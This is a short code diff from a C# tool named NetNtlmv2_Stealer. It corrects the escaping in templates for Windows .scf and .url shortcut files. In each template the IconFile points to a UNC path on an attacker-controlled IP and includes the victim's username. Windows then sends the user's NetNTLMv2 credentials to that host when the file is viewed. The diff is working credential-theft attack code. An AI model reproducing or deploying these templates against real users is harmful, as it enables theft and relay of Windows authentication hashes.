@@ -22,13 +22,13 @@ namespace NetNtlmv2_Stealer
             string[] templates = new string[2] {
 @$"[Shell]
 Command=2
-IconFile=\\\\{ip}\\share\\%USERNAME%.ico
+IconFile=\\{ip}\share\%USERNAME%.ico
 [Taskbar]
 Command=ToggleDesktop",
 $@"[InternetShortcut]
 URL=https://ired.team
-WorkingDirectory=C:\\Users\\Public
-IconFile=\\\\{ip}\\%USERNAME%.icon
+WorkingDirectory=C:\Users\Public
+IconFile=\\{ip}\%USERNAME%.icon
 IconIndex=1"
             };
 
